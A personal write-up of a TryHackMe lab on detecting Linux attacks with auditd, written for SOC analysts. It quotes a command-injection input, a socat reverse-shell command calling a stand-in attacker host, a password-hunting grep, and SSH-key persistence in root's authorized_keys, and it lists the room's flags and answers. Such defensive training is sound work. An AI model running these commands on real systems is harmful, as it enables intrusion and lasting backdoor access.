# Linux Threat Detection 3

**Platform:** TryHackMe | **Path:** Linux Security Monitoring | **Difficulty:** Hard
**Room Link:** https://tryhackme.com/room/linuxthreatdetection3

---
## What This Room Covers
Advanced Linux attacks — command injection reverse shells, credential-based privilege escalation, and persistence via services, cron, sudo users, and SSH keys — detected using auditd and ausearch.

---
## Key Concepts Learned

**Command injection → reverse shell is a two-step chain.** First confirmed RCE with `127.0.0.1 && whoami` (output: `svctrypingme`), then escalated to full shell via `socat TCP:attacker.thm:1337 EXEC:sh`. The web shell was just a foothold — the reverse shell provides an interactive terminal.

**`.env` files are a primary credential hunting target.** `grep -iR pass .` recursively searches all files for the string "pass". This caught a `.env` file containing the root password, enabling `su root` for full privilege escalation. This command pattern in auditd is a high-value, low-noise detection rule.

**Linux persistence mechanisms**
| Method | Detection Log |
|---|---|
| Systemd service | `/var/log/syslog` — service created events |
| Cron job | `/var/log/syslog` — cron execution logs |
| New sudo user | `/var/log/auth.log` — useradd/usermod events |
| SSH authorized_keys | auditd file write on `authorized_keys` |

**SSH key persistence is the most durable.** Adding an attacker's public key to `/root/.ssh/authorized_keys` gives permanent passwordless access that survives password resets and most IR procedures that don't check SSH keys specifically.

---
## Task Answers
| Question | Answer |
|---|---|
| Output after `127.0.0.1 && whoami` | `svctrypingme` |
| Flag from reverse shell task | `THM{revshells_practitioner!}` |
| IP that spawned reverse shell | `10.14.105.255` |
| Command used to hunt passwords | `grep -iR pass .` |
| Command used to escalate to root | `su root` |
| Root password found | `nGql1pQkGa` |
| Flag from service persistence | `THM{hidden_penguin!}` |
| Flag from cron persistence | `THM{ressurect_on_reboot!}` |
| User created and added to sudo | `koichi` |
| File changed for SSH key persistence | `/root/.ssh/authorized_keys` |
| Does Linux ransomware exist? | `Yea` |
| Learn Linux even if working with Windows? | `Yea` |

---
## How This Applies to Real SOC Work
Linux and Windows threats converge at persistence and C2. The TTPs here — reverse shells, credential hunting, service persistence, SSH key backdoors — are directly analogous to the Windows techniques in the previous module. A SOC analyst who understands both is far more effective on hybrid environments, which is what every real organization runs.
